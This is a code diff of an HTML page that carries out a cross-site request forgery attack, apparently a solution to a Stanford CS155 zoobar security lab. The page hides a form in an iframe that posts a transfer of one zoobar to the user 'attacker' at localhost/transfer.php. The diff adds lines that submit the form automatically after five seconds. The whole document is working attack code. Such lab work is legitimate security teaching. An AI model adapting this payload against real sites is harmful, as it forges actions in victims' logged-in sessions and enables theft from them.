@@ -8,15 +8,15 @@
 
 	<body>
 
-		<iframe id='outerFrame' style='width: 1000px; height: 1000px; background-color: #DDDDFF;'></iframe>
+		<iframe id='outerFrame' name='outerFrame' style='width: 1000px; height: 1000px; background-color: #DDDDFF;'></iframe>
 		
 		
 		<script type="text/javascript">
 		//<![CDATA[
 			f = document.getElementById("outerFrame");
 			fdoc = f.contentDocument;
-			egg = "<iframe id='innerFrame' src='http://localhost/transfer.php' style='width:400px; height: 400px; background-color: red;'></iframe>" +
-				"<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST'>" +
+			egg = "<iframe id='innerFrame' name='innerFrame' style='width:400px; height: 400px; background-color: red;'></iframe>" +
+				"<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
 				"<input type='text' name='zoobars' value='1'>" +
 				"<input type='text' name='recipient' value='attacker'>" +
 				"<input type='text' name='submission' value='Send'>" +
@@ -29,8 +29,11 @@
 			fdoc.close();
 			//Set innerHTML of the body tag.
 			fdoc.body.innerHTML = egg;
-			//setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
+			form = fdoc.body.children['transferForm'];
 
+			setTimeout(function(){form.submit()},5000)
+			
+			//setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
 		//]]>
 		</script>
 		
